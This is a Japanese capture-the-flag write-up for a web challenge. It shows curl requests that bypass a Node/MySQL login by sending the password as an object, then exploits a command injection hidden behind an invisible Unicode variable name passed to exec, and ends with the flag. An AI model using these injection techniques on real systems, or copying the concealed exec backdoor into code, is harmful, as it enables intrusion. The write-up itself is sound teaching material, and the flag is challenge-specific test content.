# Hidden Character:Web:200pts
It takes one character [ ] to show you that the path to salvation  
And it takes a hidden character to lead you to the flag  
[https://typhooncon-hiddencharacter.chals.io/](https://typhooncon-hiddencharacter.chals.io/)  
Flag format: SSD{...}  

# Solution
URLのみが渡される。  
アクセスするとログインフォームのようだ。  
Login Form with [password]  
[site1.png](site/site1.png)  
dirbや特殊文字でのログインを試みるも成果がない。  
問題文に書かれている[ ]とページタイトルをヒントだと考え、以下のように配列をPOSTしてみる。  
```bash
$ curl -X POST https://typhooncon-hiddencharacter.chals.io/auth -d "username=admin&password[password]=password"
Incorrect Username and/or Password!
$ curl -X POST https://typhooncon-hiddencharacter.chals.io/auth -d "username=admin&password[a]=password"
error: Error: ER_BAD_FIELD_ERROR: Unknown column 'a' in 'where clause'
```
`password[a]`で謎のエラーが発生した。  
カラムがおかしいといわれているので、存在しそうな`id`で試す。  
```bash
$ curl -X POST https://typhooncon-hiddencharacter.chals.io/auth -d "username=admin&password[id]=passwod"
Found. Redirecting to /home
```
なぜかログインに成功した。  
同様にブラウザのリクエストを配列にすると、リダイレクトされ以下のソースコードが表示された。  
/home  
[site2.png](site/site2.png)  
ログイン処理を見ると、[ここ](https://blog.flatt.tech/entry/node_mysql_sqlinjection)で解説されているSQLiが発生していたようだ。  
隠し機能として、`/home`の応答ヘッダの`PortaSulRetro`を叩くと疎通確認が行える箇所がみられる。  
```js
~~~
app.get("/home", function (request, response) {
  if (request.session.loggedin) {
    var options = { headers: { 'PortaSulRetro': portasulretro } };

    response.sendFile(path.join(__dirname + "/login.js"), options);
  } else {
    response.send("Please login to view this page!");
    response.end();
  }
});

// Check whether we can reach google.com and example.com
app.get(`/${portasulretro}`, async (req, res) => {
  const { timeout,ㅤ} = req.query;
  const checkCommands = [
      'ping -c 1 google.com', 
      'curl -s http://example.com/',ㅤ
  ];

  try {
      const outcomes = await Promise.all(checkCommands.map(cmd => 
              cmd && exec(cmd, { timeout: +timeout || 5_000 })));

      res.status(200).contentType('text/plain');

      var outcomeStdout = '';
      for(i = 0; outcome = outcomes[i]; i ++)  {
        outcomeStdout += `"${checkCommands[i]}": `;
        outcomeStdout += "\n\n";
        outcomeStdout += outcome.stdout.trim();
        outcomeStdout += "\n\n";
      };
      res.send(`outcome ok:\n${outcomeStdout}`);
  } catch(e) {
      res.status(500);
      res.send(`outcome failed: ${e}`);
  }
});
~~~
```
OSコマンドを実行しているため脆弱性がありそうだ。  
注意深く見ると`const { timeout,ㅤ} = req.query;`が不自然な文字を含んでいることがわかる。  
他に同種の文字を探すと、`'curl -s http://example.com/',ㅤ`の行末部分にもみられる。  
JavaScriptは変数としてASCII以外も指定でき、今回はこの不自然な文字が変数として扱われている。  
この部分は`exec`で実行されるため、コマンドを指定してやることで任意の操作が行えることとなる。  
不自然な文字をパーセントエンコーディングすると`%E3%85%A4`となったので、以下のように順を追ってクエリからOSコマンドを実行する。  
初めにログインし、隠し機能のパスを取得する。  
```bash
$ curl -X POST https://typhooncon-hiddencharacter.chals.io/auth -d "username=admin&password[id]=psasswod" -v
~~~
< Set-Cookie: connect.sid=s%3AdoQGC_FVzNhVZys6b49p_Jnd__UyU_5-.W2C1Ig%2Fj0Ja4zX61iI9gb0T7KTuyHMEO0xkAAxdDhCk; Path=/; HttpOnly
~~~
$ curl https://typhooncon-hiddencharacter.chals.io/home -H "Cookie: connect.sid=s%3AdoQGC_FVzNhVZys6b49p_Jnd__UyU_5-.W2C1Ig%2Fj0Ja4zX61iI9gb0T7KTuyHMEO0xkAAxdDhCk" -v
~~~
< PortaSulRetro: 0e0412857621a454
~~~
```
クエリを`?%E3%85%A4=cmd`とし、変数に実行したいコマンドを与える。  
```bash
$ curl https://typhooncon-hiddencharacter.chals.io/0e0412857621a454?%E3%85%A4=ls -H "Cookie: connect.sid=s%3AdoQGC_FVzNhVZys6b49p_Jnd__UyU_5-.W2C1Ig%2Fj0Ja4zX61iI9gb0T7KTuyHMEO0xkAAxdDhCk"
~~~
"ls":

Dockerfile
flag
login.html
login.js
login.sql
node_modules
package-lock.json
package.json
run.sh

$ curl https://typhooncon-hiddencharacter.chals.io/0e0412857621a454?%E3%85%A4=cat%20flag -H "Cookie: connect.sid=s%3AdoQGC_FVzNhVZys6b49p_Jnd__UyU_5-.W2C1Ig%2Fj0Ja4zX61iI9gb0T7KTuyHMEO0xkAAxdDhCk"
~~~
"cat flag":

SSD{bfee01bf8ca5f1766fb91b3b4a0533614da92beb}

```
ファイルからflagが読み取れた。  

## SSD{bfee01bf8ca5f1766fb91b3b4a0533614da92beb}